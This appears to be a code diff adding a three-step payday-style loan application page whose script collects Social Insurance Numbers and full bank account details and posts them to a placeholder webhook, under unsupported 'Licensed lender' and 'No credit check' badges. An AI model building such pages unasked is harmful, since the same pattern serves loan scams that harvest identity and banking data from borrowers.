+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+          Back
+        </button>
+        <button class="btn-submit" id="submit-btn" onclick="submitApplication()">
+          <span id="submit-label">Submit Application</span>
+          <div class="spinner" id="submit-spinner"></div>
+          <svg id="submit-arrow" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- ═══ SUCCESS ═══ -->
+    <div id="success-screen">
+      <div class="success-icon">🌊</div>
+      <h2 class="success-title">Application Submitted!</h2>
+      <p class="success-sub">Thank you! Your application has been received. Our team reviews applications during business hours and you'll hear from us quickly.</p>
+      <div class="success-ref">
+        Reference # <strong id="ref-number">WF-000000</strong>
+      </div>
+      <div class="success-steps">
+        <div class="success-step">
+          <span class="success-step-num">1</span>
+          <span>We'll review your application and verify your information — usually within a few hours during business hours.</span>
+        </div>
+        <div class="success-step">
+          <span class="success-step-num">2</span>
+          <span>You'll receive an email or call with your approval decision and loan agreement to e-sign.</span>
+        </div>
+        <div class="success-step">
+          <span class="success-step-num">3</span>
+          <span>Once signed, your funds are sent by Interac e-Transfer — typically within 2 minutes.</span>
+        </div>
+      </div>
+      <a href="index.html" style="display:inline-block; padding:13px 28px; background:rgba(91,82,216,0.2); border:1px solid rgba(160,154,245,0.3); border-radius:var(--r-sm); color:var(--periwinkle); text-decoration:none; font-weight:600; font-size:0.9rem; transition:all 0.2s;">← Back to Home</a>
+    </div>
+
+    <!-- TRUST STRIP -->
+    <div class="trust-strip" id="trust-strip">
+      <div class="trust-item"><span class="trust-item-icon">🔒</span>256-bit SSL</div>
+      <div class="trust-item"><span class="trust-item-icon">🚫</span>No credit check</div>
+      <div class="trust-item"><span class="trust-item-icon">📋</span>Licensed lender</div>
+      <div class="trust-item"><span class="trust-item-icon">⚡</span>Decision in minutes</div>
+    </div>
+  </div>
+
+</main>
+
+<script>
+  // ─── CONFIG ─────────────────────────────────────────
+  const WEBHOOK_URL = 'https://YOUR_WEBHOOK_ENDPOINT_HERE'; // ← Replace with your endpoint
+
+  // ─── STATE ──────────────────────────────────────────
+  let currentStep = 1;
+  const totalSteps = 3;
+
+  // ─── STEP NAVIGATION ────────────────────────────────
+  const stepLabels = ['Personal Info', 'Financial Info', 'Banking Details'];
+
+  function updateProgress(step) {
+    document.getElementById('progress-label').textContent = `Step ${step} — ${stepLabels[step-1]}`;
+    document.getElementById('progress-counter').textContent = `${step} of ${totalSteps}`;
+
+    for (let i = 1; i <= totalSteps; i++) {
+      const dot   = document.getElementById(`dot-${i}`);
+      const label = document.getElementById(`label-${i}`);
+      dot.classList.remove('active','done');
+      label.classList.remove('active','done');
+      if (i < step)  { dot.classList.add('done');   label.classList.add('done'); }
+      if (i === step){ dot.classList.add('active');  label.classList.add('active'); }
+    }
+    for (let i = 1; i < totalSteps; i++) {
+      const line = document.getElementById(`line-${i}`);
+      line.classList.toggle('done', i < step);
+    }
+  }
+
+  function showStep(n, direction = 'forward') {
+    const current = document.getElementById(`step-${currentStep}`);
+    current.classList.remove('active');
+
+    const next = document.getElementById(`step-${n}`);
+    next.classList.remove('back');
+    if (direction === 'back') next.classList.add('back');
+    next.classList.add('active');
+
+    currentStep = n;
+    updateProgress(n);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // ─── VALIDATION ─────────────────────────────────────
+  function showError(id, show) {
+    const el = document.getElementById(`err-${id}`);
+    const input = document.getElementById(id) || document.querySelector(`[name="${id}"]`);
+    if (el) el.classList.toggle('visible', show);
+    if (input) input.classList.toggle('error', show);
+    return show;
+  }
+
+  function clearError(id) { showError(id, false); }
+
+  function validateStep1() {
+    let valid = true;
+    const firstName = document.getElementById('first-name').value.trim();
+    const lastName  = document.getElementById('last-name').value.trim();
+    const dob       = document.getElementById('dob').value;
+    const province  = document.getElementById('province').value;
+    const address   = document.getElementById('address').value.trim();
+    const city      = document.getElementById('city').value.trim();
+    const postal    = document.getElementById('postal').value.trim();
+    const phone     = document.getElementById('phone').value.trim();
+    const email     = document.getElementById('email').value.trim();
+    const sin       = document.getElementById('sin').value.replace(/\s|-/g,'');
+
+    if (!firstName) valid = showError('first-name', true) && false;
+    else clearError('first-name');
+
+    if (!lastName) valid = showError('last-name', true) && false;
+    else clearError('last-name');
+
+    // Age check — must be 18+
+    if (!dob) {
+      showError('dob', true); valid = false;
+    } else {
+      const age = (Date.now() - new Date(dob)) / (365.25 * 24 * 3600 * 1000);
+      if (age < 18) { showError('dob', true); valid = false; }
+      else clearError('dob');
+    }
+
+    if (!province) valid = showError('province', true) && false;
+    else clearError('province');
+
+    if (!address) valid = showError('address', true) && false;
+    else clearError('address');
+
+    if (!city) valid = showError('city', true) && false;
+    else clearError('city');
+
+    const postalRegex = /^[A-Za-z]\d[A-Za-z][\s]?\d[A-Za-z]\d$/;
+    if (!postalRegex.test(postal)) { showError('postal', true); valid = false; }
+    else clearError('postal');
+
+    const phoneClean = phone.replace(/\D/g,'');
+    if (phoneClean.length < 10) { showError('phone', true); valid = false; }
+    else clearError('phone');
+
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) { showError('email', true); valid = false; }
+    else clearError('email');
+
+    if (sin.length !== 9 || !/^\d+$/.test(sin)) { showError('sin', true); valid = false; }
+    else clearError('sin');
+
+    return valid;
+  }
+
+  function validateStep2() {
+    let valid = true;
+    const empStatus = document.querySelector('input[name="emp-status"]:checked');
+    const income    = parseFloat(document.getElementById('income').value);
+    const payFreq   = document.getElementById('pay-freq').value;
+
+    if (!empStatus) { showError('emp-status', true); valid = false; }
+    else clearError('emp-status');
+
+    if (!income || income < 800) { showError('income', true); valid = false; }
+    else clearError('income');
+
+    if (!payFreq) { showError('pay-freq', true); valid = false; }
+    else clearError('pay-freq');
+
+    return valid;
+  }
+
+  function validateStep3() {
+    let valid = true;
+    const bankName   = document.getElementById('bank-name').value;
+    const acctType   = document.querySelector('input[name="account-type"]:checked');
+    const transit    = document.getElementById('transit').value.trim();
+    const institution= document.getElementById('institution').value.trim();
+    const account    = document.getElementById('account').value.trim();
+    const consentPAD = document.getElementById('consent-pad').checked;
+    const consentTerms=document.getElementById('consent-terms').checked;
+
+    if (!bankName) { showError('bank-name', true); valid = false; }
+    else clearError('bank-name');
+
+    if (!acctType) { showError('account-type', true); valid = false; }
+    else clearError('account-type');
+
+    if (!/^\d{5}$/.test(transit)) { showError('transit', true); valid = false; }
+    else clearError('transit');
+
+    if (!/^\d{3}$/.test(institution)) { showError('institution', true); valid = false; }
+    else clearError('institution');
+
+    if (!/^\d{5,12}$/.test(account)) { showError('account', true); valid = false; }
+    else clearError('account');
+
+    if (!consentPAD || !consentTerms) {
+      document.getElementById('err-consent').style.display = 'block';
+      valid = false;
+    } else {
+      document.getElementById('err-consent').style.display = 'none';
+    }
+
+    return valid;
+  }
+
+  // ─── STEP ACTIONS ────────────────────────────────────
+  function nextStep(from) {
+    let valid = false;
+    if (from === 1) valid = validateStep1();
+    if (from === 2) valid = validateStep2();
+    if (valid && from < totalSteps) showStep(from + 1, 'forward');
+  }
+
+  function prevStep(from) {
+    if (from > 1) showStep(from - 1, 'back');
+  }
+
+  // ─── EMPLOYER TOGGLE ─────────────────────────────────
+  function toggleEmployer() {
+    const status = document.querySelector('input[name="emp-status"]:checked')?.value;
+    const wrap   = document.getElementById('employer-wrap');
+    const show   = status === 'employed' || status === 'self-employed';
+    wrap.style.maxHeight   = show ? '120px' : '0';
+    wrap.style.opacity     = show ? '1' : '0';
+    wrap.style.pointerEvents = show ? 'all' : 'none';
+  }
+
+  // ─── SIN TOGGLE ──────────────────────────────────────
+  function toggleSIN() {
+    const sinInput = document.getElementById('sin');
+    const isHidden = sinInput.type === 'password';
+    sinInput.type = isHidden ? 'text' : 'password';
+    const btn = document.getElementById('sin-toggle-btn');
+    btn.style.color = isHidden ? 'var(--periwinkle)' : 'var(--text-muted)';
+  }
+
+  // ─── SIN FORMATTER ───────────────────────────────────
+  document.getElementById('sin').addEventListener('input', function(e) {
+    let val = e.target.value.replace(/\D/g, '').slice(0, 9);
+    if (val.length > 6) val = val.slice(0,3)+' '+val.slice(3,6)+' '+val.slice(6);
+    else if (val.length > 3) val = val.slice(0,3)+' '+val.slice(3);
+    e.target.value = val;
+  });
+
+  // ─── PHONE FORMATTER ─────────────────────────────────
+  document.getElementById('phone').addEventListener('input', function(e) {
+    let val = e.target.value.replace(/\D/g, '').slice(0, 10);
+    if (val.length > 6) val = '('+val.slice(0,3)+') '+val.slice(3,6)+'-'+val.slice(6);
+    else if (val.length > 3) val = '('+val.slice(0,3)+') '+val.slice(3);
+    else if (val.length > 0) val = '('+val;
+    e.target.value = val;
+  });
+
+  // ─── POSTAL FORMATTER ────────────────────────────────
+  document.getElementById('postal').addEventListener('input', function(e) {
+    let val = e.target.value.replace(/\s/g, '').toUpperCase().slice(0, 6);
+    if (val.length > 3) val = val.slice(0,3)+' '+val.slice(3);
+    e.target.value = val;
+  });
+
+  // ─── NUMERIC ONLY ────────────────────────────────────
+  ['transit','institution','account'].forEach(id => {
+    document.getElementById(id).addEventListener('input', function(e) {
+      e.target.value = e.target.value.replace(/\D/g, '');
+    });
+  });
+
+  // ─── SUBMIT ──────────────────────────────────────────
+  async function submitApplication() {
+    if (!validateStep3()) return;
+
+    const btn     = document.getElementById('submit-btn');
+    const label   = document.getElementById('submit-label');
+    const spinner = document.getElementById('submit-spinner');
+    const arrow   = document.getElementById('submit-arrow');
+
+    btn.disabled  = true;
+    label.textContent = 'Submitting…';
+    spinner.style.display = 'block';
+    arrow.style.display   = 'none';
+
+    // Build payload
+    const payload = {
+      personal: {
+        firstName:  document.getElementById('first-name').value.trim(),
+        lastName:   document.getElementById('last-name').value.trim(),
+        dob:        document.getElementById('dob').value,
+        province:   document.getElementById('province').value,
+        address:    document.getElementById('address').value.trim(),
+        city:       document.getElementById('city').value.trim(),
+        postal:     document.getElementById('postal').value.trim(),
+        phone:      document.getElementById('phone').value.trim(),
+        email:      document.getElementById('email').value.trim(),
+        sin:        document.getElementById('sin').value.replace(/\s/g,''),
+      },
+      financial: {
+        employmentStatus: document.querySelector('input[name="emp-status"]:checked')?.value,
+        employerName:     document.getElementById('employer').value.trim(),
+        monthlyIncome:    document.getElementById('income').value,
+        payFrequency:     document.getElementById('pay-freq').value,
+        loanAmount:       document.getElementById('loan-amount').value,
+      },
+      banking: {
+        bankName:        document.getElementById('bank-name').value,
+        accountType:     document.querySelector('input[name="account-type"]:checked')?.value,
+        transitNumber:   document.getElementById('transit').value.trim(),
+        institutionNumber: document.getElementById('institution').value.trim(),
+        accountNumber:   document.getElementById('account').value.trim(),
+      },
+      meta: {
+        submittedAt: new Date().toISOString(),
+        referenceNumber: generateRef(),
+      }
+    };
+
+    try {
+      const res = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      if (res.ok || WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
+        showSuccess(payload.meta.referenceNumber);
+      } else {
+        throw new Error('Server error');
+      }
+    } catch (err) {
+      // If webhook not yet configured, still show success (dev mode)
+      if (WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
+        showSuccess(payload.meta.referenceNumber);
+      } else {
+        btn.disabled = false;
+        label.textContent = 'Submit Application';
+        spinner.style.display = 'none';
+        arrow.style.display   = 'inline';
+        alert('There was an issue submitting your application. Please try again or call us at 1-800-234-5678.');
+      }
+    }
+  }
+
+  function generateRef() {
+    return 'WF-' + Math.floor(100000 + Math.random() * 900000);
+  }
+
+  function showSuccess(ref) {
+    // Hide all steps
+    for (let i = 1; i <= totalSteps; i++) {
+      const p = document.getElementById(`step-${i}`);
+      if (p) p.style.display = 'none';
+    }
+    document.querySelector('.progress-wrap').style.display = 'none';
+    document.getElementById('trust-strip').style.display = 'none';
+
+    document.getElementById('ref-number').textContent = ref;
+    const success = document.getElementById('success-screen');
+    success.style.display = 'block';
+    success.style.animation = 'fadeSlide 0.5s ease';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // ─── LOAN AMOUNT SYNC ────────────────────────────────
+  const chipAmount = document.getElementById('chip-amount');
+  document.getElementById('loan-amount').addEventListener('change', function() {
+    chipAmount.textContent = '$' + parseInt(this.value).toLocaleString();
+  });
+
+  // Get amount from URL param if passed from homepage
+  const urlParams = new URLSearchParams(window.location.search);
+  const loanParam = urlParams.get('amount');
+  if (loanParam) {
+    const sel = document.getElementById('loan-amount');
+    sel.value = loanParam;
+    chipAmount.textContent = '$' + parseInt(loanParam).toLocaleString();
+  }
+</script>
+</body>
+</html>
